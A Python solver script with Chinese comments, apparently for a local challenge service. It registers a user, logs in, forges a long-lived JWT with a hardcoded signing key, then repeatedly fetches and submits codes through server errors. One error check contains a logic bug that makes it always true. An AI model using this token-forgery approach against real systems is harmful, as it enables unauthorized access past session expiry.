import requests,json,time,jwt

signup_url = 'http://127.0.0.1:1323/signup'
login_url="http://127.0.0.1:1323/login"
info_url="http://127.0.0.1:1323/api/info"
validate_url="http://127.0.0.1:1323/api/validate"
beat_delay=8

user_name = {'username': '111'}
secret_key="11111111111111" 
#用户名是         111
#root key是      11111111111111

def get_data(user_name):
    res = json.loads(requests.post(url=signup_url, data=user_name).text)
    print("getting user data...")
    return res
#上面是获得用户的信息（密码）

def login(user_data):
    global token
    res = json.loads(requests.post(url=login_url, data=user_data).text)
    print("login:"+res["token"][:15])
    token = res["token"]
#上面是用来登录

def fake_token():
    global token
    decoded_payload = jwt.decode(token,secret_key, algorithms=['HS256'])
    new_exp=decoded_payload["exp"]+10000
    new_payload={"name": "111","exp": new_exp}
    token = jwt.encode(new_payload, secret_key, algorithm='HS256')
    print("fake a new token:"+token[:15])
#（关键）上面是通过已知的密钥，伪造长时间有效token

def get_and_post_code(token):
    headers={
        "Authorization": "Bearer "+token 
    }
    for i in range(1000):
        try:
            res=json.loads(requests.get(info_url,headers=headers).text)
            if "message" in res:
                err=res["message"]

                if err == "Internal Server Error":
                    print("status:2")
                    time.sleep(beat_delay)
                    continue

                elif err == "Bad Gateway":
                    print("status:3")
                    time.sleep(beat_delay)
                    continue
            
                elif err == "invalid or expired jwt" or "missing or malformed jwt":
                    print("status:4")
                    time.sleep(beat_delay)
                    continue

            else:    
                code=res["code"]
                print("get code:"+code)
                post_code(token,code)
                break
        except Exception as e:
            if "Connection refused" in str(e):
                print("status:1")
                time.sleep(beat_delay)
                continue
#（关键）当服务器出现问题时，重复提交请求，保证获得code,并且提交

def post_code(token,code):
    headers={
        "Authorization": "Bearer "+token 
    }
    data={
        "code":code
    }
    res=json.loads(requests.post(validate_url,headers=headers,data=data).text)
    print(res)
#提交获得的code

for i in range(100):
    try:
        user_data=get_data(user_name=user_name)
        login(user_data)
        fake_token()
        break
    except Exception as err:
        print("try again...")
        if "Connection refused" in str(err):
            err="status:1"
        if "'token'" in str(err):
            err="login time limit!"
        print(err)
        time.sleep(beat_delay)
#获得长时间有效token

for i in range(10):
    get_and_post_code(token)
    print(f"it is the {i+1} success!!!")
    time.sleep(30)
#提交10次不同的code